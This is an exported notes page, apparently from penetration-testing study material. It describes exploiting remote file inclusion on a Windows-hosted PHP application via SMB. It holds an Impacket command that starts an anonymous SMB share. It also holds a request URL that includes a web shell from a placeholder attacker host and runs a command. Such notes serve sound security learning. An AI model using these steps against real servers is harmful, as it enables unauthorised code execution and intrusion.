<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SMB</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SMB</h1><br/><br /><br /><strong><span style="color:#ffa500;">SMB</span></strong> (Useful for WebApp hosted on a <strong>Windows Server</strong>)<br />If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the <code>allow_url_include</code> setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.<br /><span style="text-decoration:underline;">Note:</span> this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.<br /><br />2.1. Start an SMB server using Impacket&#39;s smbserver.py, which allows anonymous authentication by default <div class="codebox"><pre>$ impacket-smbserver -smb2support share $(pwd)</pre></div><br />    <a href=""><img src="images/2362-1.png" alt="images/2362-1.png" /></a><br />2.2 Include the shell of point 1 through a UNC path (e.g. \\&lt;ATTACKER_IP&gt;\shell.php), and specify the command with (&amp;cmd=whoami) <div class="codebox"><pre>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;ATTACKER_IP&gt;\shell.php&amp;cmd=whoami</pre></div><br /></div>
</body>
</html>
